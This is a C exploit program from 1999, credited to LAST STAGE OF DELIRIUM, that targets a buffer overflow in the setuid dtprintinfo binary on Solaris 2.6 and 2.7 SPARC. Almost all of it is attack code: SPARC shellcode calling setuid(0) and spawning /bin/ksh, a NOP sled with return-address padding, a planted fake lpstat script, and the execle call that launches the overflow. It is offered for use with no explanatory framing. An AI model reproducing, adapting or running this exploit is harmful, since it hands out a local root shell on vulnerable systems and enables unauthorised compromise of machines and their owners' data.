/*## copyright LAST STAGE OF DELIRIUM aug 1999 poland        *://lsd-pl.net/ #*/
/*## /usr/dt/bin/dtprintinfo                                                 #*/

#include <fcntl.h>

#define NOPNUM 4000
#define ADRNUM 2000

char setuidcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char jump[]=
    "\x81\xc3\xe0\x08"     /* jmp     %o7+8                */
    "\x90\x10\x00\x0e"     /* mov     %sp,%o0              */
;

static char nop[]="\x80\x1c\x40\x11";

main(int argc,char **argv){
    char buffer[10000],adr[4],*b,*envp[4],display[128];
    int i,fd;

    printf("copyright LAST STAGE OF DELIRIUM aug 1999 poland  //lsd-pl.net/\n");
    printf("/usr/dt/bin/dtprintinfo for solaris 2.6 2.7 sparc\n\n");

    if(argc!=2){
        printf("usage: %s xserver:display\n",argv[0]);
        exit(-1);
    }

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+4152+2000+2000;
 
    sprintf(display,"DISPLAY=%s",argv[1]);
    envp[0]=display; 
    envp[1]=(char*)strdup("PATH=.:/usr/bin"); 
    envp[2]=(char*)strdup("HOME=/"); 
    envp[3]=0;

    if((fd=open("./lpstat",O_WRONLY|O_CREAT|O_TRUNC,0777))==-1) exit(-1);
    write(fd,"echo system for xxx:\n",23);
    close(fd);

    b=buffer; 
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execle("/usr/dt/bin/dtprintinfo","lsd","-p",buffer,0,envp);
}

